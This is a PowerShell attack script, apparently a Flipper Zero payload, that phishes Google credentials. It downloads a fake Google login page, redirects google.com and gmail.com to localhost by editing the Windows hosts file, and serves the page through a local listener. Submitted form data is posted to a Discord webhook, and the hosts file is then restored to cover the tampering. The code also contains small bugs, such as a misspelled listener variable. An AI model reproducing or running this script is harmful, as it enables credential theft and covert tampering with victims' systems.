if(-not (Test-Path -Path "$env:temp\gph.html" -PathType Leaf)){
    Invoke-RestMethod "https://raw.githubusercontent.com/Agente404/flipper/main/payloads/GooglePhishing2Discord/index.html" -OutFile "$env:temp\gph.html" | Wait-Process;
}

$hostString = "127.0.0.1 google.com`n127.0.0.1 gmail.com";
$isModified = Select-String C:\Windows\System32\Drivers\etc\hosts -Pattern $hostString;

if ($null -eq $isModified ) {    
    Add-Content C:\Windows\System32\Drivers\etc\hosts ("`n"+$hostString);
    ipconfig /flushdns;
}

$url = 'http://127.0.0.1';
$hook="";
$pageCode = Get-Content "gph.html" -Encoding UTF8 -Raw;

function Handle-Request{    
    [CmdletBinding()]
	param (
		[parameter(Position=0,Mandatory=$True)]
		[System.Net.HttpListener]$listener,
	);

    $context = $listner.GetContext();  
     
    if ($context.Request.HttpMethod -eq 'GET' -and $context.Request.RawUrl -eq '/') {
        $buffer = [Text.Encoding]::UTF8.GetBytes($pageCode);
        $context.Response.ContentLength64 = $buffer.length;
        $context.Response.OutputStream.Write($buffer, 0, $buffer.length);
        $context.Response.Close();    
    }

    if ($context.Request.HttpMethod -eq 'POST' -and $context.Request.RawUrl -eq '/') {
        $data = @{
            content = [System.IO.StreamReader]::new($context.Request.InputStream).ReadToEnd()
        } | ConvertTo-Json;
        
        Invoke-RestMethod -ContentType 'Application/Json' -Uri $hook  -Method Post -Body $data | Wait-Process;

        (Get-Content C:\Windows\System32\Drivers\etc\hosts | Select-String -pattern $hostString -notmatch) | Set-Content C:\Windows\System32\Drivers\etc\hosts;
        ipconfig /flushdns;

        $buffer = [Text.Encoding]::UTF8.GetBytes("");
        $context.Response.Headers.Add("Content-Type","text/plain");
        $context.Response.ContentLength64 = $buffer.length;
        $context.Response.StatusCode = 200;
        $context.Response.OutputStream.Write($buffer, 0, $buffer.length);
        $context.Response.Close();

        $listner.Stop();
    }
}

$http = New-Object System.Net.HttpListener;
$http.Prefixes.Add($url + ':80/');
$http.Start();

while ($http.IsListening) {
    Handle-Request $http
}

$https = New-Object System.Net.HttpListener;
$https.Prefixes.Add($url + ':443/');
$https.Start();

while ($https.IsListening) {
    Handle-Request $https
}